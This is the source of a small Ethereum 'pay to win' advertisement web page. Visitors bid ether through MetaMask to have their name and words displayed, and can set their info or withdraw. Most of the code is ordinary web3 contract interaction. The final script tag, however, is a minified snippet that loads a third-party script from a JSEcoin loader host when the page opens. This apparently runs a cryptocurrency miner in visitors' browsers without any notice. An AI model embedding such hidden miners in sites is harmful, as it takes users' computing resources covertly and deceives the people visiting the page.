<!--A Design by W3layouts
Author: W3layouts
Author URL: http://w3layouts.com
License: Creative Commons Attribution 3.0 Unported
License URL: http://creativecommons.org/licenses/by/3.0/
-->
<!DOCTYPE html>
<html lang="en">
<head>
<title>Unstoppable Decentralized Ethereum Advertisement</title>
<!-- custom-theme -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Unstoppable,Ethereum,Advertisement,Unstoppable Ethereum Advertisement,decentralized Advertisement,decentralized" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
		function hideURLbar(){ window.scrollTo(0,1); } </script>


<!-- css files -->
<link href="css/style.css" type="text/css" rel="stylesheet" media="all">   
<!-- //css files -->

<link rel="stylesheet" href="css/font-awesome.css"> <!-- Font-Awesome-Icons-CSS -->

<link href="css/popup-box.css" rel="stylesheet" type="text/css" media="all" /> <!-- popup box css -->

</head>
<!-- body starts -->
<body>

<!-- section -->
<section class="register">
	<div class="header">
		<div class="logo">
			<a href="#">Just An Ethereum Advertisement</a>
		</div>
	<div class="social">
			<!--<li><a href="#"><span class="fa fa-facebook"></span></a></li>
			<li><a href="#"><span class="fa fa-twitter"></span></a></li>
			<li><a href="#"><span class="fa fa-linkedin"></span></a></li>
			<li><a href="#"><span class="fa fa-google-plus"></span></a></li>-->
	</div>
		<div class="clear"></div>
	</div>

	<div class="register-full">
		<div class="register-left">
			<div class="register">
				<p>Here is the thing</p>
				<h1 id="winnername">LOADING</h1>
				<p id="winnerpaid">someone who pay much</p>
				<p id="winnerword">and the words he left</p>
				<div class="content3">
					<ul>
		<!--				<li><a class="" href="#"> New Project</a></li>
						<li><a class="read" href="#"> Get Started</a></li>-->
					</ul>
				</div>
			</div>
		</div>
		<div class="register-right">
			<div class="register-in">
				<a class="book popup-with-zoom-anim button-isi zoomIn animated" data-wow-delay=".5s" href="#small-dialog2"><strong>PAY TO WIN »</strong></a>
			</div>
			<div class="register-in middle">
				<a class="book popup-with-zoom-anim button-isi zoomIn animated" data-wow-delay=".5s" href="#small-dialog"> WHO IS LOSER »</a>
			</div>
			<div class="register-in">
				<a class="book popup-with-zoom-anim button-isi zoomIn animated" data-wow-delay=".5s" href="#small-dialog1">SET MY INFO »</a>
			</div>
			<div class="clear"> </div>
		</div>
	<div class="clear"> </div>
	</div>
	<!-- copyright -->
	<p class="agile-copyright" id="loser">© 2018. All Rights Reserved </a></p>
	<!-- //copyright -->
</section>
<!-- //section -->



<!-- login form popup-->
<div class="pop-up"> 
	<div id="small-dialog" class="mfp-hide book-form">

		<div class="login-form login-form-left"> 
			<div class="agile-row m1">
				<h3>Withdraw your ETH</h3>
				<div class="clear"></div>
				<div class="login-agileits-top"> 	
					<form id="withdrawform" action="#" method="post">
						<input type="submit" value="WITHDRAW">
					</form> 	
				</div>

			</div>
			<div class="nm1">
				<p>You need have the MetaMask browser extension installed and login. Please do so now, and then reload this page.</p>
			</div>
		</div> 
		
	</div>  
</div>
<!-- //login form popup-->

<!-- subscribe form popup-->
<div class="pop-up">

	<div id="small-dialog1" class="mfp-hide book-form">

		<div  class="login-form login-form-left m1">
			<div class="agile-row">
				<h3>Who the fuck are you?</h3>
				<p>And the words you want to left!</p>
				<div class="clear"></div>
				<div class="login-agileits-top"> 	
					<form id="infoform">
						<input type="text" class="name" name="name" id="infoname" Placeholder="Your Name" required=""/>
						<input type="text" class="name" name="nameword" id="infoword" Placeholder="Your Words" required=""/>
						<input type="submit" value="Submit">
					</form> 	
				</div>
			</div>
		</div>
		<div class="nm1">
			<p>You need have the MetaMask browser extension installed and login. Please do so now, and then reload this page.</p>
		</div>
		
	</div>  
</div>
<!-- //subscribe form popup-->

<!-- register form popup-->
<div class="pop-up"> 
	<div id="small-dialog2" class="mfp-hide book-form">
	
		<div class="login-form login-form-left m1">
			<div class="agile-row">
				<h3>PAY</h3>
				<div class="login-agileits-top"> 	
					<form id="payform" action="#" method="post">
						<input id="paygweis" type="text" class="name" name="name" Placeholder="Ether Amount" required="true"/>

						<div class="login-check">
							<label class="checkbox"><input type="checkbox" name="checkbox" checked=""><i> </i> I know what I'm doing</a></label>
						</div>
						<input type="submit" value="PAY">
					</form> 	
				</div>
			</div>
		</div>
		<div class="nm1">
			<p>You need have the MetaMask browser extension installed and login. Please do so now, and then reload this page.</p>
		</div>


	</div>
</div>
<!-- //register form popup-->

<!-- js -->
<script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
<!-- //js -->

<!--popup-js-->
<script src="js/jquery.magnific-popup.js" type="text/javascript"></script>
 <script>
	$(document).ready(function() {
	$('.popup-with-zoom-anim').magnificPopup({
		type: 'inline',
		fixedContentPos: false,
		fixedBgPos: true,
		overflowY: 'auto',
		closeBtnInside: true,
		preloader: false,
		midClick: true,
		removalDelay: 300,
		mainClass: 'my-mfp-zoom-in'
	});
																	
	});
</script>
<!--//popup-js-->
<script language="javascript" type="text/javascript" src="./js/web3.min.js"></script>
<script language="javascript" type="text/javascript" src="./js/abi.js"></script>
<script>
	var contact;
	var account;

	window.addEventListener('load', function() {

		// 检查web3是否已经注入到(Mist/MetaMask)
		if (typeof web3 !== 'undefined') {
			// 使用 Mist/MetaMask 的提供者
			web3 = new Web3(web3.currentProvider);
			console.log(web3.eth.accounts)
			console.log(' metamask start the web');
			$(".nm1").hide();
		} else {
			// 处理用户没安装的情况， 比如显示一个消息
			console.log('none metamask start the web');
			web3 = new Web3( new Web3.providers.WebsocketProvider("wss://mainnet.infura.io/ws"));
			$(".m1").hide();

			// 告诉他们要安装 MetaMask 来使用我们的应用
		}
		contact = new web3.eth.Contract(abi, address);
		web3.eth.getAccounts().then(function(e){
			account = e[0];
		});

		getInfo().then(function(infos){
			console.log(infos);
			var name = infos[0];
			var words = infos[1];
			var paid = web3.utils.fromWei(infos[2],'ether' )

			var lname = infos[3];
			var lwords = infos[4];
			var lpaid = web3.utils.fromWei(infos[5],'ether' )

			if(name!=0){
				$("#winnername").text(name);
				$("#winnerword").text(words);
				$("#winnerpaid").text("paid "+paid+" ether");
			}


			if(lname!=0){
				var text = "Someone named "+lname+" used to paid "+lpaid+" ether and left some words.what a joke."
				$("#loser").text(text);
			}

		});


	})

	$("#infoform").submit(
			function (event) {
				var n = $("#infoname").val();
				var w = $("#infoword").val();
				setMyInfo(n,w)
				event.preventDefault();
		}
	);


	$("#payform").submit(
			function (event) {
				var n = $("#paygweis").val();
				payEth( web3.utils.toWei(n, 'ether'));
				event.preventDefault();
			}
	);

	$("#withdrawform").submit(
			function (event) {

				withDraw();
				event.preventDefault();
			}
	);


	function withDraw(){
		contact.methods.withdraw().send({ from:  account})
				.on("receipt", function(receipt) {
					console.log(' send success');

				})
				.on("error", function(error) {
					console.log(' send error');});
	}


	function payEth(gweis){
		contact.methods.bid().send({ from:  account,value:gweis})
				.on("receipt", function(receipt) {
					console.log(' send success');

				})
				.on("error", function(error) {
					console.log(' send error');});
	}

	function setMyInfo(name,words){


		contact.methods.setInfo(name,words).send({ from:  account,})
				.on("receipt", function(receipt) {
					console.log(' send success');

				})
				.on("error", function(error) {
					console.log(' send error');});
	}


	function getInfo() {
		return contact.methods.getWLInfo().call()
	}



</script>

<script type="text/javascript">
	!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/129773/mememe.top/0/0/",s.parentNode.insertBefore(t,s)}();
</script>

</body>	
<!-- //body ends -->
</html>